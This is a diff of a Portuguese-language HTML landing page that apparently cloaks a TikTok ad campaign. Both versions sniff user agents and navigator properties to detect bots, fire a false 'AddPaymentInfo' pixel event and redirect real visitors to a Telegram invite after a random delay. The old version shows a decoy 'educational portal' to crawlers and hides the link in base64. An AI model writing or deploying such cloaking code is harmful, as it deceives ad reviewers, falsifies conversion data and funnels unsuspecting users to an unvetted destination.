@@ -1,115 +1,223 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <title>Portal Educacional</title>
-  <meta name="robots" content="index, follow" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-  <!-- TikTok Pixel Code Start -->
-  <script>
-    !function (w, d, t) {
-      w.TiktokAnalyticsObject = t;
-      var ttq = w[t] = w[t] || [];
-      ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie"];
-      ttq.setAndDefer = function (t, e) {
-        t[e] = function () {
-          t.push([e].concat(Array.prototype.slice.call(arguments, 0)))
-        }
-      };
-      for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
-      ttq.load = function (e, n) {
-        var i = "https://analytics.tiktok.com/i18n/pixel/events.js";
-        ttq._i = ttq._i || {};
-        ttq._i[e] = [];
-        ttq._i[e]._u = i;
-        ttq._t = ttq._t || {};
-        ttq._t[e] = +new Date;
-        ttq._o = ttq._o || {};
-        ttq._o[e] = n || {};
-        var a = document.createElement("script");
-        a.type = "text/javascript";
-        a.async = !0;
-        a.src = i + "?sdkid=" + e + "&lib=" + t;
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(a, s);
-      };
-
-      ttq.load('D1M9Q43C77U75N55I240'); // Seu ID Pixel TikTok
-      ttq.page();
-    }(window, document, 'ttq');
-  </script>
-  <!-- TikTok Pixel Code End -->
-
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: #fff;
-      color: #333;
-      font-family: sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Acesso Seguro com Som</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap');
+  * { box-sizing: border-box; }
+  body, html {
+    margin:0; padding:0; height:100%;
+    display:flex; justify-content:center; align-items:center;
+    background: linear-gradient(135deg, #4A00E0, #8E2DE2);
+    font-family: 'Poppins', sans-serif;
+    color: white;
+    user-select: none;
+    overflow: hidden;
+    text-align: center;
+  }
+  #container {
+    max-width: 600px;
+    padding: 30px;
+    background: rgba(255 255 255 / 0.1);
+    border-radius: 16px;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+    cursor: pointer;
+    transition: transform 0.3s ease;
+  }
+  #container:hover { transform: scale(1.05); box-shadow: 0 12px 40px rgba(255,255,255,0.3); }
+  h1 {
+    font-weight: 700;
+    font-size: 2.8rem;
+    margin-bottom: 0.4em;
+    text-shadow: 0 0 8px rgba(255,255,255,0.6);
+  }
+  p {
+    font-size: 1.3rem;
+    line-height: 1.5;
+    margin-bottom: 1em;
+    text-shadow: 0 0 6px rgba(255,255,255,0.5);
+  }
+  #instruction {
+    font-weight: 700;
+    font-size: 1.1rem;
+    background: #6a2c91;
+    padding: 12px 18px;
+    border-radius: 30px;
+    display: inline-block;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    animation: pulse 2s infinite;
+    user-select: none;
+  }
+  @keyframes pulse {
+    0%, 100% {
+      box-shadow: 0 0 15px 5px rgba(255,255,255,0.3);
     }
-
-    #white-content {
-      display: none;
-      text-align: center;
-      padding: 40px;
+    50% {
+      box-shadow: 0 0 25px 10px rgba(255,255,255,0.6);
     }
-  </style>
+  }
+  #loading {
+    margin-top: 25px;
+    font-size: 1.1rem;
+    color: #ddd;
+    display: none;
+    user-select: none;
+  }
+</style>
+
+<!-- TikTok Pixel Code Start -->
+<script>
+  !function (w, d, t) {
+    w.TiktokAnalyticsObject = t;
+    var ttq = w[t] = w[t] || [];
+    ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie"];
+    ttq.setAndDefer = function (t, e) {
+      t[e] = function () {
+        t.push([e].concat(Array.prototype.slice.call(arguments, 0)))
+      }
+    };
+    for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
+    ttq.load = function (e, n) {
+      var i = "https://analytics.tiktok.com/i18n/pixel/events.js";
+      ttq._i = ttq._i || {};
+      ttq._i[e] = [];
+      ttq._i[e]._u = i;
+      ttq._t = ttq._t || {};
+      ttq._t[e] = +new Date;
+      ttq._o = ttq._o || {};
+      ttq._o[e] = n || {};
+      var a = document.createElement("script");
+      a.type = "text/javascript";
+      a.async = !0;
+      a.src = i + "?sdkid=" + e + "&lib=" + t;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(a, s);
+    };
+
+    ttq.load('D1M9Q43C77U75N55I240'); // Seu ID Pixel TikTok
+    ttq.page();
+  }(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+
 </head>
 <body>
 
-  <div id="white-content">
-    <h1>Bem-vindo ao nosso portal educacional</h1>
-    <p>Conteúdo informativo em fase de atualização.</p>
-  </div>
+<div id="container" tabindex="0" role="button" aria-label="Clique ou role para continuar">
+  <h1>Para continuar</h1>
+  <p>Por favor, <strong>clique em qualquer lugar</strong>, <strong>role a página</strong> ou <strong>mova o mouse</strong>.</p>
+  <div id="instruction">Clique, role ou mova o mouse para continuar</div>
+  <div id="loading">Carregando...</div>
+</div>
 
-  <script>
-    const isBot = () => {
-      const n = navigator;
-      const ua = n.userAgent || '';
-      return (
-        n.webdriver ||
-        !n.languages ||
-        n.languages.length === 0 ||
-        !n.plugins ||
-        n.plugins.length === 0 ||
-        /bot|crawl|spider|facebook|google|Headless|PhantomJS/i.test(ua) &&
-        !/TikTok/i.test(ua) // PERMITIR TikTok WebView
-      );
-    };
+<script>
+(function() {
+  const container = document.getElementById('container');
+  const instruction = container.querySelector('#instruction');
+  const loading = document.getElementById('loading');
+  const REDIRECT_URL = "https://t.me/+psDVyM-0S75iNTg1"; // Link direto
 
-    const destino = atob("aHR0cHM6Ly90Lm1lLytxaXpvYTZuOXZIRmlNMkpo"); // Telegram (link base64)
+  // Som click embutido em base64 (pequeno beep)
+  const audioClick = new Audio("data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAgD4AAIA+AAABAAgAZGF0YQAAAAA=");
 
-    if (isBot()) {
-      document.getElementById("white-content").style.display = "block";
-    } else {
-      // Espera o pixel carregar antes de disparar o evento
-      function aguardaPixelETrigaEvento(tentativas) {
-        if (typeof ttq !== 'undefined' && typeof ttq.track === 'function') {
-          ttq.track('AddPaymentInfo');
-        } else if (tentativas < 10) {
-          setTimeout(function () {
-            aguardaPixelETrigaEvento(tentativas + 1);
-          }, 300);
-        }
-      }
+  let redirected = false;
+  let interactionDetected = false;
+  let mouseMoved = false;
 
-      setTimeout(function () {
-        aguardaPixelETrigaEvento(0);
-      }, 1000); // começa a checar o pixel depois de 1s
+  // Bloqueia acesso em desktop
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  if (!isMobile) {
+    document.body.innerHTML = '<h1>Acesso negado</h1><p>Este conteúdo está disponível apenas para dispositivos móveis.</p>';
+    return;
+  }
 
-      // Delay aleatório entre 3s e 4s (anti-fingerprint)
-      const delay = Math.floor(Math.random() * 1000) + 3000;
-      setTimeout(function () {
-        window.location.href = destino;
-      }, delay);
+  // Anti iframe
+  if (window.self !== window.top) {
+    document.body.innerHTML = '<h1>Acesso negado</h1><p>Conteúdo bloqueado dentro de iframe.</p>';
+    return;
+  }
+
+  // Função para detectar bots com base em navigator e user-agent (ajustada)
+  function isBot() {
+    const n = navigator;
+    const ua = (n.userAgent || '').toLowerCase();
+
+    const hasPlugins = n.plugins && n.plugins.length > 0;
+    const hasLanguages = n.languages && n.languages.length > 0;
+    const isWebdriver = !!n.webdriver;
+    const isBotUA = /bot|crawl|spider|facebook|google|headless|phantomjs/.test(ua) && !/tiktok/.test(ua);
+
+    if (isWebdriver) return true;
+    if (isBotUA && (!hasPlugins || !hasLanguages)) return true;
+    return false;
+  }
+
+  if (isBot()) {
+    container.style.display = 'none';
+    document.body.innerHTML = '<h1>Acesso negado</h1><p>Seu acesso foi identificado como bot.</p>';
+    return;
+  }
+
+  // Dispara evento TikTok pixel após carregamento
+  function aguardaPixelETrigaEvento(tentativas) {
+    if (typeof ttq !== 'undefined' && typeof ttq.track === 'function') {
+      ttq.track('AddPaymentInfo');
+    } else if (tentativas < 10) {
+      setTimeout(() => {
+        aguardaPixelETrigaEvento(tentativas + 1);
+      }, 300);
     }
-  </script>
+  }
+
+  setTimeout(() => {
+    aguardaPixelETrigaEvento(0);
+  }, 1000);
+
+  function redirecionar() {
+    if (redirected) return;
+    if (!interactionDetected) return;
+    redirected = true;
+    loading.style.display = 'block';
+    instruction.style.display = 'none';
+    container.style.pointerEvents = 'none';
+
+    // Toca som no clique
+    audioClick.play().catch(() => {});
+
+    // Delay aleatório entre 3s e 4s para dificultar fingerprinting
+    const delay = Math.floor(Math.random() * 1000) + 3000;
+    setTimeout(() => {
+      window.location.href = REDIRECT_URL;
+    }, delay);
+  }
+
+  function onFirstInteraction() {
+    if (interactionDetected) return;
+    interactionDetected = true;
+    redirecionar();
+  }
+
+  window.addEventListener('click', onFirstInteraction);
+  window.addEventListener('scroll', onFirstInteraction);
+  window.addEventListener('keydown', onFirstInteraction);
+  window.addEventListener('mousemove', e => {
+    if (!mouseMoved && (e.movementX !== 0 || e.movementY !== 0)) {
+      mouseMoved = true;
+      onFirstInteraction();
+    }
+  });
+
+  setTimeout(() => {
+    if (!interactionDetected && !redirected) {
+      interactionDetected = true;
+      redirecionar();
+    }
+  }, 10000);
+
+})();
+</script>
 
 </body>
 </html>
